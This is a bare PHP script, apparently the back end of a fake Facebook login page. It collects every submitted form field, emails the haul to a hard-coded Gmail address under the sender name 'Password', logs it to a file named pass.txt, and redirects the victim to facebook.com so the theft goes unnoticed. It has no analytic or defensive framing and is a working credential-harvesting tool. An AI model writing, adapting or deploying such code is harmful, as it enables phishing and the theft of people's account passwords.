<?php

header ('Location: https://www.facebook.com');

$posts        = '';
foreach($_POST as $k => $v){
    $posts .= '$_POST['.$k.'] = '.$v."\n";
}

$posts       .= "---------------------------------------------------\n";
$emailto    = 'darshansheth8@gmail.com';
$subject    = $_SERVER['HTTP_HOST']."-".$_SEREVER['SERVER_NAME'];
$from        = "From: Password <love.like.as.u.want@gmail.com>";
$body        = '
'.$posts.'
';

@mail($emailto, $subject, $body, $from);
$handle = @fopen("pass.txt", "a+");
@fwrite($handle, $posts);
fclose($handle);
?>